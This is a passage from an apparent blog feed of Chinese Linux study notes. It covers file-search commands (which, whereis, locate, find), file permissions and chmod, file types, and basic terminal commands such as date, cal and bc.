title="查找脚本文件"></a>查找脚本文件</h3><ul><li><code>which [-a] command</code></li><li>会根据PATH变量区查，重点在于找出可执行文件</li></ul><h3 id="文件的查找"><a href="#文件的查找" class="headerlink" title="文件的查找"></a>文件的查找</h3><h4 id="where"><a href="#where" class="headerlink" title="where"></a>where</h4><ul><li><code>whereis [-bmsu] filename/dir</code></li><li>这个指令只会在特定的目录查找</li><li>使用<code>where -l</code>可以查看它查找的目录</li></ul><h4 id="locate-updatedb"><a href="#locate-updatedb" class="headerlink" title="locate/updatedb"></a>locate/updatedb</h4><ul><li><code>locate [-iclSr] keyword</code></li><li>会查找有关键字的文件</li><li>locate查找的数据是已建立的数据库/var/lib/mlocate</li><li>而这个数据库每天自动更新一次</li><li>使用updatedb可以根据/etc/updatedb.conf配置文件去更新数据库</li></ul><h4 id="find"><a href="#find" class="headerlink" title="find"></a>find</h4><ul><li>功能强调，比较费磁盘资源，不得已不用</li><li>可以寻找某段时间参数的文件</li><li>查找某个人、某个群组的文件，还可以查找一些<strong>孤魂文件</strong></li><li>支持通配符<em>（如`-name “*</em>keyword**”`,测试单双引号或无引号都行）</li><li>查找某类型的文件（普通f，设备bc，目录d。。）</li><li>文件大小范围查找，权限范围查找（包括特殊权限）</li><li>此外find特殊的就是支持额外的action</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@study /]# find / -perm /7000 -exec ls -l &#123;&#125; \;</span><br></pre></td></tr></table></figure><ul><li>至于怎么操作，man吧</li></ul><blockquote><p>参考《鸟哥的Linux私房菜 基础学习篇》</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 文件 </tag>
            
            <tag> 环境变量 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>（三）Linux文件权限属性</title>
      <link href="/Linux/3.%E6%96%87%E4%BB%B6%E6%9D%83%E9%99%90%E5%B1%9E%E6%80%A7.html"/>
      <url>/Linux/3.%E6%96%87%E4%BB%B6%E6%9D%83%E9%99%90%E5%B1%9E%E6%80%A7.html</url>
      
        <content type="html"><![CDATA[<p>深入理解linux内部</p><span id="more"></span><h2 id="用户与用户组"><a href="#用户与用户组" class="headerlink" title="用户与用户组"></a>用户与用户组</h2><blockquote><p>在Linux里面，任何一个文件都具有用户（user）、所属群组（group）、其他人（others）三种身份的个别权限</p></blockquote><p>所有用户都在/etc/passwd里面，个人密码在/etc/shadow里，群组则在/etc/group里面</p><h2 id="文件属性"><a href="#文件属性" class="headerlink" title="文件属性"></a>文件属性</h2><ol><li>使用<code>su -</code>切换成root</li><li>输入<code>ls -al</code><ul><li>ls代表list</li><li>-al可以列出所有文件及属性，包括隐藏文件(.)</li></ul></li></ol><p><img src="https://cdn.jsdelivr.net/gh/yangchaohe/yangchaohe.github.io@static/img/article/2019/permission.png" alt="permission"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-rw-r--r--.  1 root root    6 12月 29 23:03 1.text</span><br></pre></td></tr></table></figure><p>1.第一栏有10个字符，那个<code>.</code>应该没意义</p><ul><li>第一个字符<ul><li><code>-</code>表示文件</li><li><code>d</code>表示目录，</li><li><code>l</code>表示链接文件（link file）</li><li><code>b</code>代表设备文件里可存储的周边设备</li><li><code>c</code>代表设备文件里的串行端口设备，如鼠标、键盘等</li></ul></li><li><strong><code>2-4</code></strong>三个字符是<strong>文件拥有者</strong>的权限<ul><li><strong>r</strong>代表可读(<code>read</code>)</li><li><strong>w</strong>代表可写(<code>write</code>)</li><li><strong>x</strong>代表可执行(<code>excute</code>)</li></ul></li><li><strong><code>5-7</code></strong>是<strong>用户组</strong>的权限，<strong><code>8-10</code></strong>是<strong>其他人</strong>的权限</li><li>没权限则用<code>-</code>表示，rwx顺序不变</li></ul><p>2.第二栏表示有多少文件名链接到此节点（<code>inode</code>）</p><ul><li>每个文件会将它的权限和属性记录到inode中，由于使用目录树，每个文件都会连接到一个inode，这个属性就是代表有多少不同的文件名连接到同一个inode</li></ul><p>3.第三栏表示拥有者账号</p><p>4.第四栏表示所属用户组</p><p>5.表示大小，默认单位Byte</p><p>6.为创建日期或最近修改日期</p><ul><li>可使用<code>ls -al --full-time</code>获得所有时间格式</li></ul><p>7.第七个为文件名，带<code>.</code>的为隐藏文件</p><h2 id="权限的重要性"><a href="#权限的重要性" class="headerlink" title="权限的重要性"></a>权限的重要性</h2><ul><li>系统保护的功能</li><li>团队开发软件或数据共享的功能</li><li>未将权限设置妥当会被有心人士用来搞破坏</li><li>所以修改文件时要注意哪些不能动</li></ul><h2 id="修改文件属性和权限"><a href="#修改文件属性和权限" class="headerlink" title="修改文件属性和权限"></a>修改文件属性和权限</h2><ul><li><p><code>chgrp</code>(change group,修改所属用户组)</p></li><li><p><code>chown</code>(change owner,可以修改用户和用户组)</p></li><li><p><code>chmod</code>(修改文件权限)</p><p>1.<strong>修改数字权限</strong></p><p>权限一般是<code>rwxrwxrwx</code>九个字符，它们3个3个一组，使用数字代表每个权限</p><p><em>对照表</em></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">r:4</span><br><span class="line">W:2</span><br><span class="line">x:1</span><br></pre></td></tr></table></figure><p>每个身份的权限是相加的</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">owner：rw- ==&gt;  4+2=6</span><br><span class="line">group：rw- ==&gt;  4+2=6</span><br><span class="line">others：rw- ==&gt;  4+2=6</span><br></pre></td></tr></table></figure><p>这个文件的权限就用<code>666</code>来表示</p><p>2<strong>.符号类型修改权限</strong></p><p>格式</p></li></ul><table><thead><tr><th>指令</th><th>身份</th><th>操作</th><th>权限</th><th>文件/目录</th></tr></thead><tbody><tr><td>chmod</td><td>u(user)</td><td>+</td><td>r</td><td></td></tr><tr><td></td><td>g(group)</td><td>_</td><td>w</td><td></td></tr><tr><td></td><td>o(others)</td><td>=</td><td>x</td><td></td></tr><tr><td></td><td>a(all)</td><td></td><td></td><td></td></tr></tbody></table><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[root@study ~]# chmod u=rwx,g-x,o-wx 1.text </span><br><span class="line">[root@study ~]# ls -al</span><br><span class="line">-rwxrw-r--.  1 root root    6 12月 29 23:03 1.text</span><br></pre></td></tr></table></figure><h2 id="目录、文件权限的意义"><a href="#目录、文件权限的意义" class="headerlink" title="目录、文件权限的意义"></a>目录、文件权限的意义</h2><ul><li>目录<ul><li>r：可以查到这个目录里的文件名</li><li>w<ul><li>建立新文件和目录</li><li>删除文件（不管权限）</li><li>改已存在的文件和目录的名字</li><li>移动里面的文件</li></ul></li><li>x：是否可以进入该目录</li></ul></li><li>文件<ul><li>r：读取文件内容</li><li>w：编辑内容</li><li>x：可以被系统所执行<ul><li>与Windows不同，Windows的可执行文件时看后缀来的，比如exe、bat等，Linux就看这个权限有没有</li></ul></li></ul></li></ul><blockquote><p>需要注意的是只要你有这个目录的权限，不管这个目录下的文件是不是你的，你都能删除这些文件</p></blockquote><h2 id="文件种类和扩展名"><a href="#文件种类和扩展名" class="headerlink" title="文件种类和扩展名"></a>文件种类和扩展名</h2><h3 id="1-常规文件-第一个属性是"><a href="#1-常规文件-第一个属性是" class="headerlink" title="1.常规文件(第一个属性是-)"></a>1.常规文件(第一个属性是<code>-</code>)</h3><ul><li>纯文本文件(ASCII)：可使用<code>cat</code>来查看文件内容    </li><li>二进制文件(binary)：比如可执行文件就是二进制文件</li><li>数据文件(data)：有特殊格式，可以使用<code>last</code>读取</li></ul><h3 id="2-目录"><a href="#2-目录" class="headerlink" title="2.目录"></a>2.目录</h3><ul><li>第一个属性是<code>d</code></li></ul><h3 id="3-链接文件-link"><a href="#3-链接文件-link" class="headerlink" title="3.链接文件(link)"></a>3.链接文件(link)</h3><ul><li>第一个属性为<code>l</code>，类似windows的快捷方式</li></ul><h3 id="4-设备及设备文件-devices"><a href="#4-设备及设备文件-devices" class="headerlink" title="4.设备及设备文件(devices)"></a>4.设备及设备文件(devices)</h3><ul><li>区块设备文件：第一个属性为<code>b</code>，提供随机存取的接口设备，如硬盘等</li><li>字符(character)设备文件：第一个属性是<code>c</code>，串行接口设备，例如键盘、鼠标，一次性读取，不能截断输出</li></ul><h3 id="5-数据接口文件-sockets"><a href="#5-数据接口文件-sockets" class="headerlink" title="5.数据接口文件(sockets)"></a>5.数据接口文件(sockets)</h3><ul><li>通常在网上用来做数据交换用</li><li>第一个属性为<code>s</code></li></ul><h3 id="6-数据输送文件-FIFO-pipe"><a href="#6-数据输送文件-FIFO-pipe" class="headerlink" title="6.数据输送文件(FIFO,pipe)"></a>6.数据输送文件(FIFO,pipe)</h3><ul><li>FIFO是为了解决多个程序读取文件发生错误的一种特殊文件格式</li><li>第一个属性是<code>p</code></li></ul><h3 id="7-Linux扩展名"><a href="#7-Linux扩展名" class="headerlink" title="7.Linux扩展名"></a>7.Linux扩展名</h3><ul><li>如上，只要有x就能执行，不用管什么扩展名</li></ul><blockquote><p>拥有可执行权限也要看是否有可执行代码，不然也没用</p></blockquote><p>当然，还是要了解一些扩展名代表哪些种类</p><ul><li>*.sh：脚本或批处理文件，使用shell写的</li><li><em>Z、\</em>.tar、*.tar.gz、*.zip、*.tgz：打包的压缩文件</li><li><em>.html、\</em>.php：网页相关文件，.html可使用网页浏览器运行，.php要用客户端浏览器才行</li><li>文件名长度限制<ul><li>单一文件名或目录名限制255字节长度</li><li>emm因为想一看这文件名就知道这文件是干嘛的，所以Linux的文件名非常长</li></ul></li><li>文件名的限制<ul><li>避免和一些指令重合，要避免<code>+</code>，<code>-</code>，开头的<code>.</code></li><li>有一些字符在命令行中有特殊意义，也要避免这样命名</li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 文件 </tag>
            
            <tag> 链接 </tag>
            
            <tag> 权限 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>（二）Linux尝鲜</title>
      <link href="/Linux/2.%E4%BD%BF%E7%94%A8Linux.html"/>
      <url>/Linux/2.%E4%BD%BF%E7%94%A8Linux.html</url>
      
        <content type="html"><![CDATA[<p>是时候动手了</p><span id="more"></span><h2 id="安装问题"><a href="#安装问题" class="headerlink" title="安装问题"></a>安装问题</h2><p>使用VMware 15 Pro安装Linux时黑屏</p><p>在windows命令行输入<code>netsh winsock reset</code>解决</p><p>照书上所有流程后有了图型界面</p><div class="img-x">    <img src="https://cdn.jsdelivr.net/gh/yangchaohe/yangchaohe.github.io@static/img/article/2019/Linux.png" />    <img src="https://cdn.jsdelivr.net/gh/yangchaohe/yangchaohe.github.io@static/img/article/2019/Linux2.png"/>    <img src="https://cdn.jsdelivr.net/gh/yangchaohe/yangchaohe.github.io@static/img/article/2019/login.png" style="zoom:50%;" /></div><p>为什么Linux有登陆、注销、关机这么多选项？</p><ul><li>Linux是一个多人多任务环境，随时有不同的用户的任务在执行，不正常的关机会导致数据损毁</li><li>所以通常Linux主机都会挂一个UPS（不间断电源）</li><li>注销不是关机，只是让你的账户离开系统</li></ul><h2 id="X-Windows与命令行模式切换"><a href="#X-Windows与命令行模式切换" class="headerlink" title="X Windows与命令行模式切换"></a>X Windows与命令行模式切换</h2><ul><li><p>X Windows是窗口管理系统</p></li><li><p>命令行界面也叫终端、Terminal、Console</p></li></ul><p>Linux默认有6个终端，使用<code>Alt+Ctrl+(F1-F6)</code>切换<code>tty1-6</code></p><p>因为虚拟机默认装了图形界面，所有tty1默认是图形界面</p><ul><li>在终端中，输入<code>startx</code>也能进入图形界面，不过有几个条件<ul><li>并没有其他的<strong>X Window</strong>被占用</li><li>必须安装X Window，且X Sever能够启动</li><li>有窗口管理器，比如GNOME、KDE</li></ul></li></ul><blockquote><p>图形环境就是<strong>命令行界面加上X Window软件</strong>的结合</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/yangchaohe/yangchaohe.github.io@static/img/article/2019/terminal.png" alt="Terminal"></p><blockquote><p><code>~</code>代表用户的家目录，是一个变量，<code>$</code>代表普通用户，<code>#</code>代表root用户，root就是Linux的神</p></blockquote><h2 id="指令"><a href="#指令" class="headerlink" title="指令"></a>指令</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">command</span> [-options] parameter1 parameter2</span><br></pre></td></tr></table></figure><ul><li>第一个输入的一定是command或者可执行文件（如shell脚本）</li><li><code>[]</code>代表可选，<code>-</code>表示选项，如<code>-h</code>，<code>--</code>表示选项全称，如<code>--help</code></li><li>命令、选项、参数之间使用空格分开，不管空多少格都被认为一格</li><li>按下回车开始执行命令</li><li>命令太长使用<code>\</code>转行，也是转义字符</li><li><strong>命令区分大小写</strong></li><li>多个指令可以使用<code>;</code>分隔</li></ul><h3 id="date"><a href="#date" class="headerlink" title="date"></a>date</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[manu@study ~]$ date</span><br><span class="line">2019年 12月 29日 星期日 03:20:42 CST</span><br></pre></td></tr></table></figure><p>格式化输出</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[manu@study ~]$ date +%Y/%m/%d</span><br><span class="line">2019/12/29</span><br></pre></td></tr></table></figure><h3 id="cal-calendar"><a href="#cal-calendar" class="headerlink" title="cal(calendar)"></a>cal(calendar)</h3><ul><li>基本语法：</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ cal [month] [year]</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[manu@study ~]$ cal</span><br><span class="line">    December 2019   </span><br><span class="line">Su Mo Tu We Th Fr Sa</span><br><span class="line"> 1  2  3  4  5  6  7</span><br><span class="line"> 8  9 10 11 12 13 14</span><br><span class="line">15 16 17 18 19 20 21</span><br><span class="line">22 23 24 25 26 27 28</span><br><span class="line">29 30 31</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">[manu@study ~]$ cal 2019</span><br><span class="line">                               2019                               </span><br><span class="line"></span><br><span class="line">       January               February                 March       </span><br><span class="line">Su Mo Tu We Th Fr Sa   Su Mo Tu We Th Fr Sa   Su Mo Tu We Th Fr Sa</span><br><span class="line">       1  2  3  4  5                   1  2                   1  2</span><br><span class="line"> 6  7  8  9 10 11 12    3  4  5  6  7  8  9    3  4  5  6  7  8  9</span><br><span class="line">13 14 15 16 17 18 19   10 11 12 13 14 15 16   10 11 12 13 14 15 16</span><br><span class="line">20 21 22 23 24 25 26   17 18 19 20 21 22 23   17 18 19 20 21 22 23</span><br><span class="line">27 28 29 30 31         24 25 26 27 28         24 25 26 27 28 29 30</span><br><span class="line">                                              31</span><br><span class="line">        April                   May                   June        </span><br><span class="line">Su Mo Tu We Th Fr Sa   Su Mo Tu We Th Fr Sa   Su Mo Tu We Th Fr Sa</span><br><span class="line">    1  2  3  4  5  6             1  2  3  4                      1</span><br><span class="line"> 7  8  9 10 11 12 13    5  6  7  8  9 10 11    2  3  4  5  6  7  8</span><br><span class="line">14 15 16 17 18 19 20   12 13 14 15 16 17 18    9 10 11 12 13 14 15</span><br><span class="line">21 22 23 24 25 26 27   19 20 21 22 23 24 25   16 17 18 19 20 21 22</span><br><span class="line">28 29 30               26 27 28 29 30 31      23 24 25 26 27 28 29</span><br><span class="line">                                              30</span><br><span class="line">        July                  August                September     </span><br><span class="line">Su Mo Tu We Th Fr Sa   Su Mo Tu We Th Fr Sa   Su Mo Tu We Th Fr Sa</span><br><span class="line">    1  2  3  4  5  6                1  2  3    1  2  3  4  5  6  7</span><br><span class="line"> 7  8  9 10 11 12 13    4  5  6  7  8  9 10    8  9 10 11 12 13 14</span><br><span class="line">14 15 16 17 18 19 20   11 12 13 14 15 16 17   15 16 17 18 19 20 21</span><br><span class="line">21 22 23 24 25 26 27   18 19 20 21 22 23 24   22 23 24 25 26 27 28</span><br><span class="line">28 29 30 31            25 26 27 28 29 30 31   29 30</span><br><span class="line"></span><br><span class="line">       October               November               December      </span><br><span class="line">Su Mo Tu We Th Fr Sa   Su Mo Tu We Th Fr Sa   Su Mo Tu We Th Fr Sa</span><br><span class="line">       1  2  3  4  5                   1  2    1  2  3  4  5  6  7</span><br><span class="line"> 6  7  8  9 10 11 12    3  4  5  6  7  8  9    8  9 10 11 12 13 14</span><br><span class="line">13 14 15 16 17 18 19   10 11 12 13 14 15 16   15 16 17 18 19 20 21</span><br><span class="line">20 21 22 23 24 25 26   17 18 19 20 21 22 23   22 23 24 25 26 27 28</span><br><span class="line">27 28 29 30 31         24 25 26 27 28 29 30   29 30 31</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="bc"><a href="#bc" class="headerlink" title="bc"></a>bc</h3><p>进入简单的计算器，<code>scale</code>显示小数点后的位数，<code>quit</code>退出</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">[manu@study ~]$ bc</span><br><span class="line">bc 1.06.95</span><br><span class="line">Copyright 1991-1994, 1997, 1998, 2000, 2004, 2006 Free Software Foundation, Inc.</span><br><span class="line">This is free software with ABSOLUTELY NO WARRANTY.</span><br><span class="line">For details <span class="built_in">type</span> `warranty<span class="string">&#x27;. </span></span><br><span class="line"><span class="string">8^8</span></span><br><span class="line"><span class="string">16777216</span></span><br><span class="line"><span class="string">8*8</span></span><br><span class="line"><span class="string">64</span></span><br><span class="line"><span class="string">7/2</span></span><br><span class="line"><span class="string">3</span></span><br><span class="line"><span class="string">7%3</span></span><br><span class="line"><span class="string">1</span></span><br><span class="line"><span class="string">scale=3</span></span><br><span class="line"><span class="string">1/3</span></span><br><span class="line"><span class="string">.333</span></span><br><span class="line"><span class="string">quit</span></span><br></pre></td></tr></table></figure><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>命令有两种情况</p><ol><li>输入指令–&gt;输出–&gt;等待输入下一个指令（命令提示符环境）</li><li>输入指令（进入软件环境）–&gt;输出–&gt;结束该指令（退出软件环境）–&gt;命令提示符环境</li></ol><h2 id="热键"><a href="#热键" class="headerlink" title="热键"></a>热键</h2><h3 id="TAB"><a href="#TAB" class="headerlink" title="TAB"></a><code>TAB</code></h3><ul><li>在第一个字段连按两次，可以补全指令</li><li>在后面的字段连按两次，可文件补全<ul><li>若安装了Bash-completion，可以补全参数/选项</li></ul></li></ul><h3 id="Ctrl-C"><a href="#Ctrl-C" class="headerlink" title="Ctrl+C"></a><code>Ctrl</code>+<code>C</code></h3><ul><li>可以停止错误的、不停运行的指令</li></ul><h3 id="Ctrl-D"><a href="#Ctrl-D" class="headerlink" title="Ctrl+D"></a><code>Ctrl</code>+<code>D</code></h3><ul><li>代表键盘输入结束(End Of file,EOF或End Of Input)</li><li>也相当于输入了<code>exit</code></li></ul><h3 id="Shift-PU-PD"><a href="#Shift-PU-PD" class="headerlink" title="Shift+PU/PD"></a><code>Shift</code>+<code>PU</code>/<code>PD</code></h3><ul><li>向上、向下翻页</li></ul><h2 id="在线求助"><a href="#在线求助" class="headerlink" title="在线求助"></a>在线求助</h2><h3 id="help"><a href="#help" class="headerlink" title="--help"></a><code>--help</code></h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><span class="line">[manu@study ~]$ date --<span class="built_in">help</span> </span><br><span class="line">用法：date [选项]... [+格式]</span><br><span class="line">　或：date [-u|--utc|--universal] [MMDDhhmm[[CC]YY][.ss]]</span><br><span class="line">Display the current time <span class="keyword">in</span> the given FORMAT, or <span class="built_in">set</span> the system date.</span><br><span class="line"></span><br><span class="line">Mandatory arguments to long options are mandatory <span class="keyword">for</span> short options too.</span><br><span class="line">  -d, --date=STRING         display time described by STRING, not <span class="string">&#x27;now&#x27;</span></span><br><span class="line">  -f, --file=DATEFILE       like --date once <span class="keyword">for</span> each line of DATEFILE</span><br><span class="line">  -I[TIMESPEC], --iso-8601[=TIMESPEC]  output date/time <span class="keyword">in</span> ISO 8601 format.</span><br><span class="line">                            TIMESPEC=<span class="string">&#x27;date&#x27;</span> <span class="keyword">for</span> date only (the default),</span><br><span class="line">                            <span class="string">&#x27;hours&#x27;</span>, <span class="string">&#x27;minutes&#x27;</span>, <span class="string">&#x27;seconds&#x27;</span>, or <span class="string">&#x27;ns&#x27;</span> <span class="keyword">for</span> date</span><br><span class="line">                            and time to the indicated precision.</span><br><span class="line">  -r, --reference=文件显示文件指定文件的最后修改时间</span><br><span class="line">  -R, --rfc-2822以RFC 2822格式输出日期和时间</span><br><span class="line">例如：2006年8月7日，星期一 12:34:56 -0600</span><br><span class="line">      --rfc-3339=TIMESPEC   output date and time <span class="keyword">in</span> RFC 3339 format.</span><br><span class="line">                            TIMESPEC=<span class="string">&#x27;date&#x27;</span>, <span class="string">&#x27;seconds&#x27;</span>, or <span class="string">&#x27;ns&#x27;</span> <span class="keyword">for</span></span><br><span class="line">                            date and time to the indicated precision.</span><br><span class="line">                            Date and time components are separated by</span><br><span class="line">                            a single space: 2006-08-07 12:34:56-06:00</span><br><span class="line">  -s, --<span class="built_in">set</span>=STRING          <span class="built_in">set</span> time described by STRING</span><br><span class="line">  -u, --utc, --universal    <span class="built_in">print</span> or <span class="built_in">set</span> Coordinated Universal Time (UTC)</span><br><span class="line">      --<span class="built_in">help</span>显示此帮助信息并退出</span><br><span class="line">      --version显示版本信息并退出</span><br><span class="line"></span><br><span class="line">给定的格式FORMAT 控制着输出，解释序列如下：</span><br><span class="line"></span><br><span class="line">  %%一个文字的 %</span><br><span class="line">  %a当前locale 的星期名缩写(例如： 日，代表星期日)</span><br><span class="line">  %A当前locale 的星期名全称 (如：星期日)</span><br><span class="line">  %b当前locale 的月名缩写 (如：一，代表一月)</span><br><span class="line">  %B当前locale 的月名全称 (如：一月)</span><br><span class="line">  %c当前locale 的日期和时间 (如：2005年3月3日 星期四 23:05:25)</span><br><span class="line">  %C世纪；比如 %Y，通常为省略当前年份的后两位数字(例如：20)</span><br><span class="line">  %d按月计的日期(例如：01)</span><br><span class="line">  %D按月计的日期；等于%m/%d/%y</span><br><span class="line">  %e按月计的日期，添加空格，等于%_d</span><br><span class="line">  %F完整日期格式，等价于 %Y-%m-%d</span><br><span class="line">  %gISO-8601 格式年份的最后两位 (参见%G)</span><br><span class="line">  %GISO-8601 格式年份 (参见%V)，一般只和 %V 结合使用</span><br><span class="line">  %h等于%b</span><br><span class="line">  %H小时(00-23)</span><br><span class="line">  %I小时(00-12)</span><br><span class="line">  %j按年计的日期(001-366)</span><br><span class="line">  %k   hour, space padded ( 0..23); same as %_H</span><br><span class="line">  %l   hour, space padded ( 1..12); same as %_I</span><br><span class="line">  %m   month (01..12)</span><br><span class="line">  %M   minute (00..59)</span><br><span class="line">  %n换行</span><br><span class="line">  %N纳秒(000000000-999999999)</span><br><span class="line">  %p当前locale 下的<span class="string">&quot;上午&quot;</span>或者<span class="string">&quot;下午&quot;</span>，未知时输出为空</span><br><span class="line">  %P与%p 类似，但是输出小写字母</span><br><span class="line">  %r当前locale 下的 12 小时时钟时间 (如：11:11:04 下午)</span><br><span class="line">  %R24 小时时间的时和分，等价于 %H:%M</span><br><span class="line">  %s自UTC 时间 1970-01-01 00:00:00 以来所经过的秒数</span><br><span class="line">  %S秒(00-60)</span><br><span class="line">  %t输出制表符 Tab</span><br><span class="line">  %T时间，等于%H:%M:%S</span><br><span class="line">  %u星期，1 代表星期一</span><br><span class="line">  %U一年中的第几周，以周日为每星期第一天(00-53)</span><br><span class="line">  %VISO-8601 格式规范下的一年中第几周，以周一为每星期第一天(01-53)</span><br><span class="line">  %w一星期中的第几日(0-6)，0 代表周一</span><br><span class="line">  %W一年中的第几周，以周一为每星期第一天(00-53)</span><br><span class="line">  %x当前locale 下的日期描述 (如：12/31/99)</span><br><span class="line">  %X当前locale 下的时间描述 (如：23:13:48)</span><br><span class="line">  %y年份最后两位数位 (00-99)</span><br><span class="line">  %Y年份</span><br><span class="line">  %z +hhmm数字时区(例如，-0400)</span><br><span class="line">  %:z +hh:mm数字时区(例如，-04:00)</span><br><span class="line">  %::z +hh:mm:ss数字时区(例如，-04:00:00)</span><br><span class="line">  %:::z数字时区带有必要的精度 (例如，-04，+05:30)</span><br><span class="line">  %Z按字母表排序的时区缩写 (例如，EDT)</span><br><span class="line"></span><br><span class="line">默认情况下，日期的数字区域以0 填充。</span><br><span class="line">The following optional flags may follow <span class="string">&#x27;%&#x27;</span>:</span><br><span class="line"></span><br><span class="line">  -  (hyphen) <span class="keyword">do</span> not pad the field</span><br><span class="line">  _  (underscore) pad with spaces</span><br><span class="line">  0  (zero) pad with zeros</span><br><span class="line">  ^  use upper <span class="keyword">case</span> <span class="keyword">if</span> possible</span><br><span class="line">  <span class="comment">#  use opposite case if possible</span></span><br><span class="line"></span><br><span class="line">在任何标记之后还允许一个可选的域宽度指定，它是一个十进制数字。</span><br><span class="line">作为一个可选的修饰声明，它可以是E，在可能的情况下使用本地环境关联的</span><br><span class="line">表示方式；或者是O，在可能的情况下使用本地环境关联的数字符号。</span><br><span class="line"></span><br><span class="line">Examples:</span><br><span class="line">Convert seconds since the epoch (1970-01-01 UTC) to a date</span><br><span class="line">  $ date --date=<span class="string">&#x27;@2147483647&#x27;</span></span><br><span class="line"></span><br><span class="line">Show the time on the west coast of the US (use tzselect(1) to find TZ)</span><br><span class="line">  $ TZ=<span class="string">&#x27;America/Los_Angeles&#x27;</span> date</span><br><span class="line"></span><br><span class="line">Show the <span class="built_in">local</span> time <span class="keyword">for</span> 9AM next Friday on the west coast of the US</span><br><span class="line">  $ date --date=<span class="string">&#x27;TZ=&quot;America/Los_Angeles&quot; 09:00 next 